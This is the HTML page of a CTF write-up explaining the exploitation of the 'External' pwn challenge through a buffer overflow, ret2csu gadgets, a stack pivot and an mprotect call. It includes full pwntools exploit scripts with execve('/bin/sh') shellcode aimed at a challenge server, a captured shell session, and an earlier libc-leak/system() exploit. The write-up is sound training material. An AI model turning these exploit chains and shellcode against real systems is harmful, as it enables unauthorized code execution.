@@ -1,0 +1,248 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>External | fernetInjection</title><meta name=description content="We are fernetInjection, a CTF team from Argentina 🇦🇷. Here you can find our write-ups and reflections."><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:title" content="External"><meta property="og:description" content="Recon As usual, we&rsquo;ll start off by taking a look at the mitigations enabled in the binary:
+$ checksec --file=./external RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 81) Symbols No 0 3 ./external Cool, there&rsquo;s no PIE and no canary, that will simplify things a bit in case we find a buffer overflow."><meta property="og:type" content="article"><meta property="og:url" content="https://fernetinjection.github.io/posts/2021-02-01-external/"><meta property="article:published_time" content="2021-02-01T09:00:00+00:00"><meta property="article:modified_time" content="2021-02-01T09:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="External"><meta name=twitter:description content="Recon As usual, we&rsquo;ll start off by taking a look at the mitigations enabled in the binary:
+$ checksec --file=./external RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 81) Symbols No 0 3 ./external Cool, there&rsquo;s no PIE and no canary, that will simplify things a bit in case we find a buffer overflow."><link rel=stylesheet href=https://fernetinjection.github.io/css/style-dark.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://fernetinjection.github.io/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a><a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a><a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast');" style=display:none><i class="fas fa-chevron-up fa-lg"></i></a><span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://fernetinjection.github.io/posts/2021-02-01-maze/><i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li><li><a class=icon href=https://fernetinjection.github.io/posts/2021-02-01-echo/><i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li><li><a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li><li><a class=icon href=#><i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
+<span id=i-next class=info style=display:none>Next post</span>
+<span id=i-top class=info style=display:none>Back to top</span>
+<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f"><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&text=External"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&is_video=false&description=External"><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=External&body=Check out this article: https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f"><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.stumbleupon.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-stumbleupon" aria-hidden=true></i></a></li><li><a class=icon href="http://digg.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-digg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&name=External&description=Recon%20As%20usual%2c%20we%26rsquo%3bll%20start%20off%20by%20taking%20a%20look%20at%20the%20mitigations%20enabled%20in%20the%20binary%3a%0a%24%20checksec%20--file%3d.%2fexternal%20RELRO%20STACK%20CANARY%20NX%20PIE%20RPATH%20RUNPATH%20Symbols%20FORTIFY%20Fortified%20Fortifiable%20FILE%20Partial%20RELRO%20No%20canary%20found%20NX%20enabled%20No%20PIE%20No%20RPATH%20No%20RUNPATH%2081%29%20Symbols%20No%200%203%20.%2fexternal%20Cool%2c%20there%26rsquo%3bs%20no%20PIE%20and%20no%20canary%2c%20that%20will%20simplify%20things%20a%20bit%20in%20case%20we%20find%20a%20buffer%20overflow."><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&t=External"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#finding-gadgets>Finding gadgets</a></li><li><a href=#finding-the-stack>Finding the stack</a><ul><li><a href=#invoking-mprotect>Invoking mprotect</a></li></ul></li><li><a href=#putting-it-all-together>Putting it all together</a></li><li><a href=#honorable-mentions>Honorable mentions</a></li></ul></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">External</h1><div class=meta><div class=postdate><time datetime="2021-02-01 09:00:00 +0000 UTC" itemprop=datePublished>2021-02-01</time></div><div class=article-category><i class="fas fa-archive"></i><a class=category-link href=/categories/ctf>CTF</a></div><div class=article-tag><i class="fas fa-tag"></i><a class=tag-link href=/tags/pwn rel=tag>Pwn</a>
+<a class=tag-link href=/tags/ctf_0x41414141 rel=tag>CTF_0x41414141</a>
+<a class=tag-link href=/tags/exploitation rel=tag>Exploitation</a></div></div></header><div class=content itemprop=articleBody><h2 id=recon>Recon</h2><p>As usual, we&rsquo;ll start off by taking a look at the mitigations enabled in the binary:</p><pre><code>$ checksec --file=./external  
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   81) Symbols       No    0               3               ./external
+</code></pre><p>Cool, there&rsquo;s no PIE and no canary, that will simplify things a bit in case we find a buffer overflow. Additionally, after opening the file with <code>cutter</code> we see that it&rsquo;s linked against <code>libc</code>, this may come in handy as well, since the GOT is writeable.
+Now, we&rsquo;ll take an actual look at the disassembly itself, this is the code for <code>main</code>:</p><pre><code>: int main (int argc, char **argv, char **envp);
+; var void *buf @ rbp-0x50
+0x00401224      push    rbp
+0x00401225      mov     rbp, rsp
+0x00401228      sub     rsp, 0x50
+
+		; puts(&quot;ROP me\n&quot;)
+0x0040122c      lea     rdi, str.ROP_me ; 0x402012 ; const char *s
+0x00401233      call    puts       ; sym.imp.puts ; int puts(const char *s)
+
+		; printf(&quot;&gt; &quot;)
+0x00401238      lea     rdi, [0x0040201c] ; const char *format
+0x0040123f      mov     eax, 0
+0x00401244      call    printf     ; sym.imp.printf ; int printf(const char *format)
+
+		; read(0, buf, 150)
+0x00401249      lea     rax, [buf]
+0x0040124d      mov     edx, 0xf0  ; 240 ; size_t nbyte
+0x00401252      mov     rsi, rax   ; void *buf
+0x00401255      mov     edi, 0     ; int fildes
+0x0040125a      call    read       ; sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
+
+		; clear_got()
+0x0040125f      mov     eax, 0
+0x00401264      call    clear_got  ; sym.clear_got
+
+		; return 0
+0x00401269      mov     eax, 0
+0x0040126e      leave
+0x0040126f      ret
+
+; comments added for clarity
+</code></pre><p>It seems simple enough, it will print a pretty suggestive message (namely, &ldquo;ROP me\n> &ldquo;), read from stdin into a buffer on the stack, and then call <code>clear_got</code>. <code>clear_got</code> does exactly what one would expect, it <code>memset</code>s the whole GOT to 0 (more on this later). If we look at the buffer in which our answer will be stored, we can see it begins at address <code>rbp-0x50</code> but it will read <code>0xf0</code> bytes into that buffer, resulting in a buffer overflow and giving us control over both the <code>rip</code> and <code>rbp</code> after the function returns (remember that <code>leave; ret</code> will move <code>rbp</code> to <code>rsp</code> and pop both <code>rbp</code> and <code>rip</code> from the stack).</p><p>So far we can overflow the buffer to overwrite the <code>rip</code> stored in the stack, and make <code>main</code> return to whatever address we want. Recall that PIE is not enabled, this means that the binary will be loaded into the same virtual memory address every time the program is executed. And if the binary is always loaded into the same address, then every address within the binary will remain constant across different executions, and will be the same on remote as well. What all of this means is that we can just hard-code addresses into the payload, since they&rsquo;re guaranteed to be the same on remote (this only applies to addresses within the binary, not to stack addresses and so on). This will be a huge benefit when we start working on our ROP chain.</p><blockquote><p>While I&rsquo;m at it, here&rsquo;s a quick remainder on ROP (Return Oriented Programming). Basically, it works by changing the return address of a given function (in our case, <code>main</code>). We&rsquo;ll make <code>main</code> return to an un-intended address, where there&rsquo;s some code that&rsquo;s of interest to us. The program will continue to execute that code until it hits another <code>ret</code>, at which point it will return to whatever address is found on the top of the stack. If at the time of sending the payload we get the math right, we can make that second <code>ret</code> jump to another portion of code that&rsquo;s of interest to us, and so on.
+We&rsquo;re only limited by the amount of bytes we&rsquo;re able to write during the first <code>read</code> (we can write <code>0xf0</code> bytes, but the first <code>0x50</code> will be ignored becase they reside inside the stack frame for <code>main</code>, that leaves us with <code>0x40</code> bytes for our exploit), and by the availability of &lsquo;interesting&rsquo; portions of code that end with a <code>ret</code> instruction.</p></blockquote><p>At this point it looks like all of this will be pretty easy, right? There&rsquo;s only one problem, the GOT has been zero-ed out. Why is this important? Well, the GOT (Global Offset Table) hold the address for every libc function our binary could possibly want. When we make a call to a libc function, the program will lookup the address of that function in the GOT, and then jump to it. This is what a call to <code>printf</code> does, as an example:</p><pre><code>: int printf (const char *format);
+0x00401050      jmp     qword [reloc.printf] ; 0x404028
+0x00401056      push    2          ; 2
+0x0040105b      jmp     section..plt
+</code></pre><p>As you can see, the first thing <code>printf</code> does is jump to whatever address is stored in <code>0x404028</code>, that&rsquo;s the entry for <code>printf</code> in the GOT. When the binary first loads, that address will be filled with the qword <code>0x401056</code>, so jumping to <code>reloc.printf</code> will do nothing but going to the next instruction. When that happens, the dynamic linker will be called, and it will fill the GOT with the correct address for <code>printf</code>. After that, <code>reloc.printf</code> will point to the actual code for <code>printf</code>, which means any subsequent calls will be resolved much faster.</p><h2 id=exploitation>Exploitation</h2><p>Now let&rsquo;s move on to the actual exploit.</p><p>As you can probably imagine, in order to bypass the fact that the GOT has been erased, we could jump directly to <code>0x401056</code> and have the GOT entry for <code>printf</code> re-populated. We could do that for every libc function, and then go from there. That&rsquo;s entirely doable and it was, in fact, our first approach. We constructed a ROP chain that would call all of the libc functions in the GOT. This would re-populate the GOT, and give us the possibility of using libc functions again. Once this was done, we would call <code>printf</code> with the right arguments in order to leak addresses from the libc and calculate the address of <code>system</code>. Finally, would have everything we needed to call <code>system("/bin/sh")</code>.</p><p>And it worked&mldr; locally. For some unkown reason this exploit worked like a charm on our local hosts, but not on remote. After some debugging we found that calling <code>memset</code> was bringing up trouble (maybe because we couldn&rsquo;t control the third argument passed on to it, so it would try to <code>memset</code> too many bytes?).</p><blockquote><p>For a more in-depth explaination on how to leak libc addresses, and how that helps to identify what libc version is being used on remote check out the write-up on <code>The Pwn Inn</code> from this same CTF, in which we dive into a lot more detail on how it works. Since this was not the way we ended up solving the challenge, we won&rsquo;t delve into too much detail on it right now (though the code we tried can be found at the end of this write-up).</p></blockquote><p>At last, we decided to go down a different path, we&rsquo;ll try to invoke <code>mprotect</code> somehow, and get the stack to be executable. At that point we can open up a shell with a little bit of shellcode, no libc involved. There are only two problems: 1) we don&rsquo;t know where the stack is located, 2) we lack gadgets.</p><blockquote><p>Quick note for those un-familiar with ROP. Remember how I talked about using &lsquo;interesting&rsquo; bits of code ending in a <code>ret</code> instruction before? It turns out those pieces of code are called &lsquo;gadgets&rsquo;.</p></blockquote><p>Let&rsquo;s quickly address each of these issues:</p><h3 id=finding-gadgets>Finding gadgets</h3><p>As it turns out, we&rsquo;re surprisingly low on gadgets. We need at the very least five things: a way to control <code>rax</code>, <code>rdi</code>, <code>rsi</code> and <code>rdx</code>, plus a <code>syscall</code> instruction. Why? Well, if we want to make a <code>mprotect</code> syscall we&rsquo;ll want to control all three parameters passed on to it (these are stored in <code>rdi</code>, <code>rsi</code> and <code>rdx</code> respectively), the syscall number is stored in <code>rax</code> and the syscall is made with the <code>syscall</code> instruction. We&rsquo;re asking for a lot of things here, but the only useful gadgets we&rsquo;ve managed to find are:</p><pre><code>$ ROPgadget --binary ./external                                                                                                                                                       1 ⨯
+Gadgets information
+============================================================
+0x0000000000401269 : mov eax, 0 ; leave ; ret
+; ...
+0x000000000040127d : mov eax, 1 ; syscall
+; ...
+0x00000000004012f3 : pop rdi ; ret
+0x00000000004012f1 : pop rsi ; pop r15 ; ret
+; ...
+0x000000000040101a : ret
+; ...
+0x0000000000401277 : syscall
+
+Unique gadgets found: 106
+</code></pre><p>And of course we can also use some parts of the actual disassembly as well.</p><p>Well, we can control <code>rdi</code>, <code>rsi</code>, invoke <code>syscall</code> with <code>rax</code> equal to 1 or 0, and not a whole lot more. But if we look closely at the code we can find something useful:</p><pre><code>: __libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
+; arg int64_t arg1 @ rdi
+; arg int64_t arg2 @ rsi
+; arg int64_t arg3 @ rdx
+; ...
+0x004012d0      mov     rdx, r14
+0x004012d3      mov     rsi, r13
+0x004012d6      mov     edi, r12d
+0x004012d9      call    qword [r15 + rbx*8]
+0x004012dd      add     rbx, 1
+0x004012e1      cmp     rbp, rbx
+0x004012e4      jne     0x4012d0
+0x004012e6      add     rsp, 8
+0x004012ea      pop     rbx
+0x004012eb      pop     rbp
+0x004012ec      pop     r12
+0x004012ee      pop     r13
+0x004012f0      pop     r14
+0x004012f2      pop     r15
+0x004012f4      ret
+</code></pre><p>Isn&rsquo;t this a bit interesting? Say we jumped to address <code>0x4012ea</code>, then <code>rbx</code>, <code>rbp</code> and <code>r12</code> through <code>r15</code> will be popped from the stack, then a <code>ret</code> will be executed. What if that <code>ret</code> jumped to address <code>0x4012d0</code>? Then all those values previously popped from the stack would be inserted into <code>rdx</code>, <code>rsi</code> and <code>edi</code>. That&rsquo;s just what we want!</p><blockquote><p>Actually, using this approach we can write an arbitrary value into <code>edi</code> (the lower 32 bits of <code>rdi</code>), but we don&rsquo;t need to worry that much about this, because all of the addresses we&rsquo;re interested in fit in one dword, plus writing to <code>edi</code> zeros out the higher 32 bits of <code>rdi</code>.</p></blockquote><p>There&rsquo;s a catch though, <code>r15 + rbx * 8</code> will need to point to an address where another address is stored. That second address should point to some code that won&rsquo;t modify <code>rdx</code> (ideally none of the previous registers, but <code>rdx</code> is the only one we really can&rsquo;t afford to lose), and that will eventually lead to a <code>ret</code>. Also, since the instruction at <code>0x4012d9</code> is a <code>call</code>, it will push the <code>rip</code> into the stack, so our ROP will not continue until the <code>ret</code> at <code>0x4012f4</code> is executed (and, for that to work <code>rbp</code> should be equal to <code>rbx</code> minus 1).</p><p>This isn&rsquo;t so bad as it may seem at first glance, though. If we load <code>0x403e38</code> into <code>r15</code> and <code>0x0</code> into <code>rbx</code> then that call at <code>0x4012d9</code> will take us to the following bit of code:</p><pre><code>: _fini ();
+0x00401308      endbr64            ; [14] -r-x section size 13 named .fini
+0x0040130c      sub     rsp, 8
+0x00401310      add     rsp, 8
+0x00401314      ret
+</code></pre><p>That&rsquo;s because, for whatever reason, the qword stored at <code>0x403e38</code> is equal to <code>0x401308</code> (don&rsquo;t ask me where I got that from, hours of staring at <code>hexdump</code>&rsquo;s output were involved). Since <code>rbp</code> should be equal to <code>rbx</code> minus 1, and <code>rbx</code> needs to be <code>0x0</code>, we don&rsquo;t have a choice but to load <code>0x1</code> into <code>rbp</code>.</p><p>This is getting a little convoluted, I hope I didn&rsquo;t lose you so far. To summarize, the only takeaway here is: <code>rdx</code> is ours, but changing its value will cost us a lot of space in our ROP chain. This isn&rsquo;t really a problem though, since we can just use this gigantic ROP chain to fire a second <code>read</code> syscall. One might (fairly) argue: Why make such an annoying ROP chain just to invoke <code>read</code> again? Well, now that we control the arguments passed on to read, we can make the second <code>read</code> call read an enormous amount of bytes, and store the result in a known address. As we&rsquo;ll see, this will come in handy later on.</p><blockquote><p>Where did those two functions <code>_fini</code> and <code>__libc_csu_init</code> come from? Well, it turns out these are pieces of code that the compiler automatically attaches to our executable every time we compile a program (at least gcc does it on GNU/Linux). Using these gadgets is known as <code>ret2csu</code>, you can read more about it and how it&rsquo;s used on <a href=https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf>this paper</a>.</p></blockquote><h3 id=finding-the-stack>Finding the stack</h3><p>I&rsquo;ll say this upfront: we don&rsquo;t need to find the stack. After the <code>read</code> discussed in the previous section is executed, we can use the region of code used for storing the results as a fake stack. It&rsquo;ll work like this:</p><ul><li>Use the ROP chain discussed previously to read as many bytes as we want into address <code>X</code> (we need to make sure this address is writeable first)</li><li>Make <code>rsp</code> point to address <code>X</code></li><li>Continue executing our ROP from there</li></ul><p>That&rsquo;s it! Now we&rsquo;ve got a larger buffer that we can use to invoke <code>mprotect</code>, since our &lsquo;stack&rsquo; is now at a known address we can make that region executable, and finally jump to our shellcode (which should be stored there as well).</p><h4 id=invoking-mprotect>Invoking mprotect</h4><p>Quick sidenote on invoking <code>mprotect</code>: we&rsquo;ve no direct control over <code>rax</code>, to get over this we can use our ROP chain to invoke a <code>write</code> syscall.</p><blockquote><p>Recall that we now control <code>rdi</code>, <code>rsi</code> and <code>rdx</code>, and that there&rsquo;s a gadget that does <code>mov rax, 1; syscall; ret</code> (<code>1</code> is the syscall number for <code>write</code>), so invoking syscall with the right arguments should be no problem.</p></blockquote><p>We can tell the kernel to write <code>0x0a</code> bytes (the syscall number for <code>mprotect</code>) from any readable address into the standard output, as a result the kernel will store the number of writen bytes (<code>0x0a</code>) into <code>rax</code>. As you can see, it just takes a little bit of work, but that way we can control <code>rax</code> as well!</p><h3 id=putting-it-all-together>Putting it all together</h3><p>All of this might feel a bit overwhelming because of all the details involved, but try to keep in mind the core idea:</p><ul><li>We have a way of invoking a read syscall controlling all of it&rsquo;s arguments, so we read an awful amount of bytes into some address <code>X</code>.</li><li>We make <code>rsp</code> point to that address (using gadgets like <code>leave; ret</code>, since we have control over <code>rbp</code>).</li><li>Now the &lsquo;stack&rsquo; will be located at a known address and we have total control over it&rsquo;s contents. So we use this fake stack to call <code>write(1, [whatever], 0x0a)</code> using the same mechanism as used in step 1. Effectively filling <code>rax</code> with <code>0x0a</code>.</li><li>Now that <code>rax</code> is <code>0x0a</code> we again use the same mechanism as the one in step 1 to invoke a syscall that will make the whole memory page at <code>X</code> executable.</li><li>We jump to our shellcode, which will be stored at <code>X + [someOffset]</code></li></ul><p>The resulting exploit will look something like this (using Python and pwntools):</p><pre><code>from pwn import *
+
+context.update(os='linux', arch='amd64')
+
+p = remote('161.97.176.150', 9999)
+
+# First payload, this will just trigger read(0, 0x404000, 0x1000)
+# Why 0x404000? Well, that's a read-write memory section, that means the whole page 
+# is read-write, so we've got 0x1000 bytes to play around with at that address
+payload0 = b''
+payload0 += 0x58 * b'A'      # padding
+payload0 += p64(0x4012ea)    # address of gadget 1 (pop rbx; pop ... ; ret)
+payload0 += p64(0x0)         # rbx
+payload0 += p64(0x1)         # rbp
+payload0 += p64(0x0)         # r12
+payload0 += p64(0x404000)    # r13
+payload0 += p64(0x1000)      # r14
+payload0 += p64(0x403e38)    # r15
+payload0 += p64(0x4012d0)    # address of gadget 2 (mov rdx, r14; mov ...; call [r15 + rbx * 8])
+
+# Since after the call instruction (address 0x4012dd) rbx, rbp, 
+# r12-r15 will be popped again, we need to add some padding
+payload0 += (7 * 0x8) * b'A' # padding
+payload0 += p64(0x401283)    # address of syscall ; ret
+payload0 += p64(0x4012ed)    # address of gadget 3 (pop rsp; pop ... x3 ; ret)
+# Address of our new 'stack' (will be poped into rsp)
+payload0 += p64(0x404000)
+
+p.info('Sending ' + hex(len(payload0)) + ' bytes')
+
+p.recvuntil(b'&gt; ')
+p.send(payload0)
+
+# This payload will be read into our fake stack, we need to remember that because
+# of gadget 3 from payload 1 (pop rsp; 3 x pop ; ret) we need to insert 0x18 bytes of
+# padding at the beginning
+
+payload1 = b''
+payload1 += b'A' * 0x18      # padding
+
+# Let's trigger write(1, 0x404000, 0xa) so we can set rax to 0xa
+# Same concept as before, fill rdi, rsi, rdx with the desired values
+payload1 += p64(0x4012ea)    # gadget 1
+payload1 += p64(0x0)         # rbx
+payload1 += p64(0x1)         # rbp
+payload1 += p64(0x1)         # r12
+payload1 += p64(0x404000)    # r13
+payload1 += p64(0xa)         # r14
+payload1 += p64(0x403e38)    # r15
+payload1 += p64(0x4012d0)    # gadget 2
+payload1 += (7 * 0x8) * b'A' # padding
+payload1 += p64(0x40127c)    # mov rax, 1; syscall ; ret
+
+# Now that rax is set to 0x0a, let's trigger mprotect(0x404000, 0x1000, 0x7)
+# Again, same concept, fill rdi, rsi and rdx with the desired values
+payload1 += p64(0x4012ea)    # gadget 1
+payload1 += p64(0x0)         # rbx
+payload1 += p64(0x1)         # rbp
+payload1 += p64(0x404000)    # r12
+payload1 += p64(0x1000)      # r13
+payload1 += p64(0x7)         # r14
+payload1 += p64(0x403e38)    # r15
+payload1 += p64(0x4012d0)    # gadget 2
+payload1 += (7 * 0x8) * b'A' # padding
+payload1 += p64(0x401283)    # syscall ; ret
+
+# Address of our shellcode, our payload begins at address 0x404000, so we should add
+# the current length of the payload plus 0x8, to account for this value
+payload1 += p64(0x404000 + len(payload1) + 8)
+
+# Basic shellcode that triggers execve('/bin/sh', 0, 0), since the 'read' syscall
+# is used to read the shellcode we don't need to worry about special characters 
+# null characters, or anything of the like
+shellcode = b'\xb8\x3b\x00\x00\x00\x48\x8d\x3d\x08\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00'
+payload1 += shellcode
+
+p.send(payload1)
+p.info('Sending ' + hex(len(payload1)) + ' bytes')
+
+# Recieve those 0xa bytes we've written so that the output doesn't get poluted
+p.recv(0xa) 
+
+# Profit!
+p.interactive()
+</code></pre><p>The exploit in action:</p><pre><code>$ python exploit.py 
+[+] Opening connection to 161.97.176.150 on port 9999: Done
+[*] Sending 0xe8 bytes
+[*] Sending 0x13c bytes
+[*] Switching to interactive mode
+$ ls
+bin
+dev
+etc
+external
+flag.txt
+lib
+lib64
+usr
+$ cat flag.txt
+flag{0h_nO_My_G0t!!!!1111!1!}
+$  
+</code></pre><hr><h3 id=honorable-mentions>Honorable mentions</h3><p>For those of you who are curious, here&rsquo;s the initial attempt that we made which I talked about earlier (populating the GOT and calling <code>system</code>):</p><pre><code>from pwn import *
+import sys
+
+context(os='linux', arch='amd64')
+
+binary = ELF('./external')
+
+# This is the libc in use on remote. We found out the version
+# by leaking addresses and looking at the offsets between them
+libc = ELF('./libc-2.28.so')
+
+off_printf_got = binary.got['printf']
+off_system_libc = libc.symbols['system']
+off_printf_libc = libc.symbols['printf']
+off_binsh_libc = next(libc.search(&quot;/bin/sh&quot;))
+
+exploit  = b&quot;\x41&quot; * 0x58       # buffer + rbp
+exploit += p64(0x4012f3)        # pop rdi ; ret
+exploit += p64(0x402012)        # rdi = &amp;&quot;Ropme&quot;
+exploit += p64(0x401056)        # printf call
+exploit += p64(0x4012f3)        # pop rdi ; ret
+exploit += p64(off_printf_got)  # rdi = printf@got
+exploit += p64(0x401036)        # puts call
+exploit += p64(0x4012f3)        # pop rdi ; ret
+exploit += p64(0x404050)        # rdi -&gt; data section
+exploit += p64(0x401066)        # memset call
+exploit += p64(0x401086)        # read call
+exploit += p64(binary.symbols['main'])
+
+p = remote('161.97.176.150', 9999)
+p.recvline()
+p.recvuntil(' ')
+p.sendline(exploit)
+printf_libc_addr = p.recvline()
+printf_libc_addr = u64(printf_libc_addr[9:-1]+&quot;\x00\x00&quot;)
+
+system = printf_libc_addr - off_printf_libc + off_system_libc
+binsh = printf_libc_addr - off_printf_libc + off_binsh_libc
+
+log.info(&quot;printf @ {}&quot;.format(hex(printf_libc_addr)))
+log.info(&quot;offset printf @ {}&quot;.format(hex(off_printf_libc)))
+log.info(&quot;offset system @ {}&quot;.format(hex(off_system_libc)))
+log.info(&quot;offset /bin/sh @ {}&quot;.format(hex(off_binsh_libc)))
+log.info(&quot;system @ {}&quot;.format(hex(system)))
+log.info(&quot;/bin/sh @ {}&quot;.format(hex(binsh)))
+
+exploit2  = b&quot;\x41&quot; * 0x58       # buffer + rbp
+exploit2 += p64(0x4012f3)        # pop rdi ; ret
+exploit2 += p64(binsh)           # rdi -&gt; /bin/sh
+exploit2 += p64(system)
+
+p.recvline()
+p.recvuntil(' ')
+p.sendline(exploit2)
+p.interactive()
+</code></pre><hr><h1 id=post-written-by-octaviogallandhttpsgithubcomoctaviogalland>Post written by <a href=https://github.com/OctavioGalland>@OctavioGalland</a></h1></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#finding-gadgets>Finding gadgets</a></li><li><a href=#finding-the-stack>Finding the stack</a><ul><li><a href=#invoking-mprotect>Invoking mprotect</a></li></ul></li><li><a href=#putting-it-all-together>Putting it all together</a></li><li><a href=#honorable-mentions>Honorable mentions</a></li></ul></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f"><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&text=External"><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&is_video=false&description=External"><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=External&body=Check out this article: https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f"><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.stumbleupon.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-stumbleupon fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://digg.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&title=External"><i class="fab fa-digg fa-lg" aria-hidden=true></i></a></li><li><a class=icon 